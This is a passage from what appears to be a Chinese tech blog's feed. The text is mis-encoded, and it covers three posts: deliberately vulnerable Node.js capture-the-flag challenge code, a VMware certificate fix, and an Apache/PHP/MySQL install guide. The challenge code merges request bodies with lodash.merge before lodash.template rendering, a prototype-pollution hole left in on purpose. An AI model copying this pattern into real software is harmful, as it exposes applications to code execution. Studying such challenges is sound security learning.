class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> lodash = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;lodash&#x27;</span>)<br><span class="hljs-keyword">const</span> session = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express-session&#x27;</span>)<br><span class="hljs-keyword">const</span> randomize = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;randomatic&#x27;</span>)<br><span class="hljs-keyword">const</span> app = express()<br>app.use(bodyParser.urlencoded(&#123;<span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span>&#125;)).use(bodyParser.json()) <span class="hljs-comment">//å¤„ç†JSONæ•°æ®</span><br>app.use(<span class="hljs-string">&#x27;/static&#x27;</span>, express.static(<span class="hljs-string">&#x27;static&#x27;</span>))<br>app.use(session(&#123;<br>    <span class="hljs-attr">name</span>: <span class="hljs-string">&#x27;thejs.session&#x27;</span>,<br>    <span class="hljs-attr">secret</span>: randomize(<span class="hljs-string">&#x27;aA0&#x27;</span>, <span class="hljs-number">16</span>),<br>    <span class="hljs-attr">resave</span>: <span class="hljs-literal">false</span>,<br>    <span class="hljs-attr">saveUninitialized</span>: <span class="hljs-literal">false</span>     <span class="hljs-comment">//è®¾ç½®ä¸€ä¸‹Session</span><br>&#125;))<br>app.engine(<span class="hljs-string">&#x27;ejs&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">filePath, options, callback</span>) </span>&#123; <span class="hljs-comment">// define the template engine</span><br>    fs.readFile(filePath, <span class="hljs-function">(<span class="hljs-params">err, content</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> callback(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(err)) <span class="hljs-comment">//è°ƒç”¨ejsè¿›è¡Œæ¸²æŸ“</span><br>        <span class="hljs-keyword">let</span> compiled = lodash.template(content) <span class="hljs-comment">//æ¸²æŸ“å†…å®¹</span><br>        <span class="hljs-keyword">let</span> rendered = compiled(&#123;...options&#125;) <span class="hljs-comment">//åŠ¨æ€å¼•å…¥æˆå‘˜å˜é‡</span><br>    <span class="hljs-keyword">return</span> callback(<span class="hljs-literal">null</span>, rendered) <span class="hljs-comment">//ä¼ å›æ¥</span><br>&#125;)<br>&#125;)<br>app.set(<span class="hljs-string">&#x27;views&#x27;</span>, <span class="hljs-string">&#x27;./views&#x27;</span>)<br>app.set(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;ejs&#x27;</span>)<br>app.all(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> data = req.session.data || &#123;<span class="hljs-attr">language</span>: [], <span class="hljs-attr">category</span>: []&#125;<br>    <span class="hljs-keyword">if</span> (req.method == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>        data = lodash.merge(data, req.body)<br>        req.session.data = data<br>    &#125;    <span class="hljs-comment">//å°†bodyä¸­çš„æ•°æ®ä¼ å…¥sessioNä¸­</span><br>res.render(<span class="hljs-string">&#x27;index&#x27;</span>, &#123;<br>    <span class="hljs-attr">language</span>: data.language,<br>    <span class="hljs-attr">category</span>: data.category <span class="hljs-comment">//æ¸²æŸ“è‡ªå·±çš„é€‰æ‹©</span><br>&#125;)<br>&#125;)<br>app.listen(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">console</span>.log(Example app listening on port <span class="hljs-number">3000</span>!))<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">var</span> hbs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;hbs&#x27;</span>)<br><span class="hljs-keyword">var</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>)<br><span class="hljs-keyword">const</span> md5 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;md5&#x27;</span>)<br><span class="hljs-keyword">var</span> morganBody = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;morgan-body&#x27;</span>)<br><span class="hljs-keyword">const</span> app = express()<br><span class="hljs-keyword">var</span> user = [] <span class="hljs-comment">//empty for now</span><br><span class="hljs-keyword">var</span> matrix = []<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>  matrix[i] = [<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>]<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">draw</span> (<span class="hljs-params">mat</span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> count = <span class="hljs-number">0</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">3</span>; j++) &#123;<br>      <span class="hljs-keyword">if</span> (matrix[i][j] !== <span class="hljs-literal">null</span>) &#123;<br>        count += <span class="hljs-number">1</span><br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> count === <span class="hljs-number">9</span><br>&#125;<br>app.use(express.static(<span class="hljs-string">&#x27;public&#x27;</span>))<br>app.use(bodyParser.json())<br>app.set(<span class="hljs-string">&#x27;view engine&#x27;</span>, <span class="hljs-string">&#x27;html&#x27;</span>)<br>morganBody(app)<br>app.engine(<span class="hljs-string">&#x27;html&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;hbs&#x27;</span>).__express)<br><br>app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>    matrix[i] = [<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>]<br>  &#125;<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>)<br>&#125;)<br>app.get(<span class="hljs-string">&#x27;/admin&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-comment">/*this is under development I guess ??*/</span><br>  <span class="hljs-built_in">console</span>.log(user.admintoken)<br>  <span class="hljs-keyword">if</span> (<br>    user.admintoken &amp;&amp;<br>    req.query.querytoken &amp;&amp;<br>    md5(user.admintoken) === req.query.querytoken<br>  ) &#123;<br>    res.send(<br>      <span class="hljs-string">&#x27;Hey admin your flag is &lt;b&gt;flag&#123;prototype_pollution_is_very_dangerous&#125;&lt;/b&gt;&#x27;</span><br>    )<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.status(<span class="hljs-number">403</span>).send(<span class="hljs-string">&#x27;Forbidden&#x27;</span>)<br>  &#125;<br>&#125;)<br>app.post(<span class="hljs-string">&#x27;/api&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">var</span> client = req.body<br>  <span class="hljs-keyword">var</span> winner = <span class="hljs-literal">null</span><br><br>  <span class="hljs-keyword">if</span> (client.row &gt; <span class="hljs-number">3</span> || client.col &gt; <span class="hljs-number">3</span>) &#123;<br>    client.row %= <span class="hljs-number">3</span><br>    client.col %= <span class="hljs-number">3</span><br>  &#125;<br>  matrix[client.row][client.col] = client.data<br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>    <span class="hljs-keyword">if</span> (matrix[i][<span class="hljs-number">0</span>] === matrix[i][<span class="hljs-number">1</span>] &amp;&amp; matrix[i][<span class="hljs-number">1</span>] === matrix[i][<span class="hljs-number">2</span>]) &#123;<br>      <span class="hljs-keyword">if</span> (matrix[i][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;X&#x27;</span>) &#123;<br>        winner = <span class="hljs-number">1</span><br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (matrix[i][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;O&#x27;</span>) &#123;<br>        winner = <span class="hljs-number">2</span><br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][i] === matrix[<span class="hljs-number">1</span>][i] &amp;&amp; matrix[<span class="hljs-number">1</span>][i] === matrix[<span class="hljs-number">2</span>][i]) &#123;<br>      <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][i] === <span class="hljs-string">&#x27;X&#x27;</span>) &#123;<br>        winner = <span class="hljs-number">1</span><br>      &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (matrix[<span class="hljs-number">0</span>][i] === <span class="hljs-string">&#x27;O&#x27;</span>) &#123;<br>        winner = <span class="hljs-number">2</span><br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;X&#x27;</span><br>  ) &#123;<br>    winner = <span class="hljs-number">1</span><br>  &#125;<br>  <span class="hljs-keyword">if</span> (<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">2</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;O&#x27;</span><br>  ) &#123;<br>    winner = <span class="hljs-number">2</span><br>  &#125;<br><br>  <span class="hljs-keyword">if</span> (<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;X&#x27;</span><br>  ) &#123;<br>    winner = <span class="hljs-number">1</span><br>  &#125;<br>  <span class="hljs-keyword">if</span> (<br>    matrix[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>] === matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] === matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] &amp;&amp;<br>    matrix[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] === <span class="hljs-string">&#x27;O&#x27;</span><br>  ) &#123;<br>    winner = <span class="hljs-number">2</span><br>  &#125;<br>  <span class="hljs-keyword">if</span> (draw(matrix) &amp;&amp; winner === <span class="hljs-literal">null</span>) &#123;<br>    res.send(<span class="hljs-built_in">JSON</span>.stringify(&#123; <span class="hljs-attr">winner</span>: <span class="hljs-number">0</span> &#125;))<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (winner !== <span class="hljs-literal">null</span>) &#123;<br>    res.send(<span class="hljs-built_in">JSON</span>.stringify(&#123; <span class="hljs-attr">winner</span>: winner &#125;))<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    res.send(<span class="hljs-built_in">JSON</span>.stringify(&#123; <span class="hljs-attr">winner</span>: -<span class="hljs-number">1</span> &#125;))<br>  &#125;<br>&#125;)<br>app.listen(<span class="hljs-number">3000</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;app listening on port 3000!&#x27;</span>)<br>&#125;)<br></code></pre></td></tr></table></figure><p>é¦–å…ˆåˆ¤æ–­è¯·æ±‚æ–¹å¼æ˜¯ POSTï¼Œç„¶åè¿›è¡Œä¸‹ä¸€æ­¥ï¼Œé€šè¿‡ lodash.mergeï¼Œå°†æˆ‘ä»¬ body ä¸­çš„æ•°å€¼ç»™ data,ç„¶å session ä¸­å‚¨å­˜è¿™ä¸ª dataï¼Œè¿™é‡Œä¹Ÿå¤§æ¦‚è·Ÿäº†ä¸€ä¸‹ lodash.mergeï¼Œå…¶åŸç†åº”è¯¥å°±æ˜¯æ­£å¸¸çš„ mergeã€‚</p><p>èµ‹å€¼å®Œäº†ä¹‹åè¿›è¡Œæ¸²æŸ“ index,åœ¨æ¸²æŸ“çš„é€‚åˆï¼Œä¼šè·³åˆ°ä¸‹é¢è¿™ä¸ªå‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.engine(<span class="hljs-string">&#x27;ejs&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">filePath, options, callback</span>) </span>&#123;<br>  <span class="hljs-comment">// define the template engine</span><br>  fs.readFile(filePath, <span class="hljs-function">(<span class="hljs-params">err, content</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> callback(<span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(err))<br>    <span class="hljs-keyword">let</span> compiled = lodash.template(content)<br>    <span class="hljs-keyword">let</span> rendered = compiled(&#123; ...options &#125;)<br>    <span class="hljs-keyword">return</span> callback(<span class="hljs-literal">null</span>, rendered)<br>  &#125;)<br>&#125;)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cs</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vmè¯ä¹¦bug</title>
    <link href="/2021/03/05/vm%E8%AF%81%E4%B9%A6bug/"/>
    <url>/2021/03/05/vm%E8%AF%81%E4%B9%A6bug/</url>
    
    <content type="html"><![CDATA[<p>åŸå› ï¼šVMware Authorization Serviceè¿™ä¸ªæœåŠ¡æ›¿æ¢äº†æœ¬åœ°æ ¹è¯ä¹¦<br><img src="https://img-blog.csdnimg.cn/2021030518513134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70#pic_center"><br>è§£å†³æ–¹æ¡ˆï¼š<br>æ‰“å¼€æ§åˆ¶é¢æ¿-ç®¡ç†å·¥å…·-æœåŠ¡ï¼Œè®¾ç½®VMware workstation serverè¿™ä¸ªæœåŠ¡çš„å¯åŠ¨ç±»å‹ä¸ºæ‰‹åŠ¨</p>]]></content>
    
    
    <categories>
      
      <category>æ‚è°ˆ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>debug</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mysql+Apache+PHP</title>
    <link href="/2021/01/31/%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA/"/>
    <url>/2021/01/31/%E7%BD%91%E7%AB%99%E6%A1%86%E6%9E%B6%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¸€ã€å®‰è£…apache"><a href="#ä¸€ã€å®‰è£…apache" class="headerlink" title="ä¸€ã€å®‰è£…apache"></a>ä¸€ã€å®‰è£…apache</h1><p>é«˜ç‰ˆæœ¬ä¸å†æä¾›msiå®‰è£… ä¸‹è½½åˆ°çš„ä¸ºå‹ç¼©åŒ…æ–¹å¼ éœ€è¦æ‰‹åŠ¨æ³¨å†ŒapacheæœåŠ¡</p><ul><li>å°†apacheè§£å‹è‡³ç›®æ ‡æ–‡ä»¶å¤¹å¹¶é…ç½®<code>conf/httpd.conf</code>ï¼š<br><img src="https://img-blog.csdnimg.cn/20210126102746612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></li><li>ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œcmdï¼Œé”®å…¥<code> .\..\Apache\bin&gt;httpd.exe -k install -n apache</code> å®‰è£…æœåŠ¡</li><li>é”®å…¥<code>httpd.exe</code>å³å¯å¯åŠ¨æœåŠ¡</li><li>åœ¨æµè§ˆå™¨ä¸­é”®å…¥localhost:ç«¯å£å·<br>å¦‚ä¸‹å³apacheå®‰è£…æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/202101271130525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"></li></ul><h1 id="äºŒã€å®‰è£…php"><a href="#äºŒã€å®‰è£…php" class="headerlink" title="äºŒã€å®‰è£…php"></a>äºŒã€å®‰è£…php</h1><p>ä¸‹è½½å¥½php.zipè§£å‹è‡³ç›®æ ‡æ–‡ä»¶å¤¹ï¼ˆæ³¨æ„ï¼šä¸‹è½½çš„phpåº”è¯¥æ˜¯æœ‰çº¿ç¨‹å®‰å…¨çš„ç‰ˆæœ¬ï¼‰</p><p>å†™ä¸€ä¸ª1.phpï¼ˆecho hello worldï¼‰<br>cmdé‡Œé”®å…¥<code>php.exe -f 1.php</code><br><img src="https://img-blog.csdnimg.cn/20210127113446262.png"><br>æ²¡é—®é¢˜phpå®‰è£…æˆåŠŸï¼Œæ¥ä¸‹æ¥</p><h1 id="ä¸‰ã€ä»apacheåŠ è½½php"><a href="#ä¸‰ã€ä»apacheåŠ è½½php" class="headerlink" title="ä¸‰ã€ä»apacheåŠ è½½php"></a>ä¸‰ã€ä»apacheåŠ è½½php</h1><ul><li>æ‰“å¼€phpæ–‡ä»¶ä¸­çš„<code>php.ini-development</code>æ”¹åä¸º<code>php.ini</code></li><li>ä¿®æ”¹<code>php.ini</code>çš„è¯­å¥ï¼š<br>â‘ å»æ‰è¯­å¥<code>;extension_dir=â€œextâ€</code>åˆ†å·ï¼ˆiniæ–‡ä»¶ä¸­;å·ä¸ºæ³¨é‡Šç¬¦ï¼‰<br>â‘¡åŒå¼•å·å†…çš„<code>ext</code>æ›´æ”¹ä¸º<code>phpå®‰è£…ç›®å½•/ext</code></li><li>ä¿®æ”¹<code>apache/conf/httpd.conf</code> åœ¨LoadModuleä»£ç åŒºä¸‹æ–¹æ·»åŠ ï¼š<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"> <span class="hljs-comment">#phpå®‰è£…è·¯å¾„/php7apache2_4.dll</span><br>LoadModule php_module <span class="hljs-string">&quot;phpå®‰è£…ç›®å½•/php7apache2_4.dll&quot;</span> <br> <span class="hljs-comment">#phpå®‰è£…è·¯å¾„</span><br>PHPIniDir <span class="hljs-string">&quot;phpå®‰è£…ç›®å½•&quot;</span> <br><span class="hljs-comment">#å…³è” *.php æ–‡ä»¶</span><br>AddType application/x-httpd-php <span class="hljs-string">.php</span> <span class="hljs-string">.phtml</span><br></code></pre></td></tr></table></figure></li></ul><p>é…ç½®ä¸­ä½¿ç”¨<br><code>httpd.exe -t</code> æŸ¥çœ‹é…ç½®æœ‰æ— é—®é¢˜<br><code>htttp.exe -M</code> æŸ¥çœ‹åŠ è½½çš„æ¨¡å—<br><img src="https://img-blog.csdnimg.cn/20210127134103576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MTYzMDcz,size_1,color_FFFFFF,t_70"><br>æ­å»ºæ—¶æ³¨æ„ï¼š</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ada">ä¸€ã€apacheå’Œphpçš„ç‰ˆæœ¬è¿è¡Œåº“è¦æ±‚ä¸€è‡´ å¦åˆ™æŠ¥é”™can<span class="hljs-symbol">&#x27;t</span> locate api moduleï¼ˆåŸå› æœªæ˜ï¼‰<br>äºŒã€apacheå’Œphpé…ç½®æ–‡ä»¶ä¸­è·¯å¾„éƒ½ä½¿ç”¨/ä½œä¸ºè·¯å¾„åˆ†éš”ç¬¦ ä¸å¾—ä½¿ç”¨\ï¼ˆä¼šå½“æˆè½¬ä¹‰å­—ç¬¦ å¼•å‘æŠ¥é”™ï¼‰<br>ä¸‰ã€ä»apacheåŠ è½½phpæ¨¡å—æ—¶ æ³¨æ„ä»£ç æ³¨é‡Šä¸èƒ½ç½®äºè¯­å¥åï¼ˆtmå°±æ˜¯ä¸ªå¤©å‘ æµªè´¹è€å­æ—¶é—´ï¼‰<br></code></pre></td></tr></table></figure><h1 id="å››ã€å®‰è£…mysql"><a href="#å››ã€å®‰è£…mysql" class="headerlink" title="å››ã€å®‰è£…mysql"></a>å››ã€å®‰è£…mysql</h1><p>å¯ä»¥ä½¿ç”¨ç¦»çº¿å®‰è£…ç‰ˆ è¿™é‡Œç†Ÿæ‚‰ç¯å¢ƒçš„é…ç½® æé«˜éš¾åº¦<br>é€‰æ‹©è§£å‹ç¼©ç‰ˆï¼š</p><ul><li><p>ä¸‹è½½å¥½mysql è§£å‹ç¼©è‡³ç›®æ ‡æ–‡ä»¶å¤¹å¹¶åˆ›å»º<code>my.ini</code></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[mysqld]</span> <br><span class="hljs-comment"># è®¾ç½®mysqlçš„å®‰è£…ç›®å½•ï¼Œä¹Ÿå°±æ˜¯åˆšæ‰æˆ‘ä»¬è§£å‹çš„ç›®å½•</span><br><span class="hljs-attr">basedir</span>=D:/blog/mysql<br><span class="hljs-comment"># è®¾ç½®mysqlæ•°æ®åº“çš„æ•°æ®çš„å­˜æ”¾ç›®å½•</span><br><span class="hljs-attr">datadir</span>=D:/blog/mysql/data<br><span class="hljs-comment"># è®¾ç½®é»˜è®¤ä½¿ç”¨çš„ç«¯å£</span><br><span class="hljs-attr">port</span>=<span class="hljs-number">3306</span><br><span class="hljs-comment"># å…è®¸æœ€å¤§è¿æ¥æ•°</span><br><span class="hljs-attr">max_connections</span>=<span class="hljs-number">200</span><br><span class="hljs-comment"># å…è®¸è¿æ¥å¤±è´¥çš„æ¬¡æ•°ã€‚è¿™æ˜¯ä¸ºäº†é˜²æ­¢æœ‰äººè¯•å›¾æ”»å‡»æ•°æ®åº“</span><br><span class="hljs-attr">max_connect_errors</span>=<span class="hljs-number">10</span><br><span class="hljs-comment"># æœåŠ¡ç«¯ä½¿ç”¨çš„å­—ç¬¦é›†</span><br><span class="hljs-attr">character-set-server</span>=utf8mb4<br><span class="hljs-comment"># æ•°æ®åº“å­—ç¬¦é›†å¯¹åº”ä¸€äº›æ’åºç­‰è§„åˆ™ä½¿ç”¨çš„å­—ç¬¦é›†</span><br><span class="hljs-attr">collation-server</span>=utf8mb4_general_ci<br><span class="hljs-comment"># åˆ›å»ºæ–°è¡¨æ—¶å°†ä½¿ç”¨çš„é»˜è®¤å­˜å‚¨å¼•æ“</span><br><span class="hljs-attr">default-storage-engine</span>=INNODB<br><span class="hljs-comment"># é»˜è®¤ä½¿ç”¨â€œmysql_native_passwordâ€æ’ä»¶ä½œä¸ºè®¤è¯åŠ å¯†æ–¹å¼</span><br><span class="hljs-comment"># MySQL8.0é»˜è®¤è®¤è¯åŠ å¯†æ–¹å¼ä¸ºcaching_sha2_password</span><br><span class="hljs-attr">default_authentication_plugin</span>=mysql_native_password<br> <br><span class="hljs-section">[mysql]</span><br><span class="hljs-comment"># è®¾ç½®mysqlå®¢æˆ·ç«¯é»˜è®¤å­—ç¬¦é›†</span><br><span class="hljs-attr">default-character-set</span>=utf8mb4<br> <br><span class="hljs-section">[client]</span><br><span class="hljs-attr">default-character-set</span>=utf8mb4<br><span class="hljs-attr">port</span>=<span class="hljs-number">3306</span><br></code></pre></td></tr></table></figure><p>â‘  ä»¥ç®¡ç†å‘˜çš„èº«ä»½è¿è¡Œcmdï¼š</p></li><li><p>åˆå§‹åŒ–æ•°æ®åº“<code>./../mysql/bin&gt;mysqld --initialize --console</code><br><img src="https://img-blog.csdnimg.cn/20210127213544982.png"> <strong>( root@localhost: fu8eu&gt;cGj8Cc )</strong></p></li><li><p>å®‰è£…æœåŠ¡ï¼š<code>./../mysql/bin&gt;mysqld -install</code><br><img src="https://img-blog.csdnimg.cn/20210127213644968.png"></p></li><li><p>å¯åŠ¨æœåŠ¡ï¼š<code>net start mysqlæˆ–sc start mysql</code><br><img 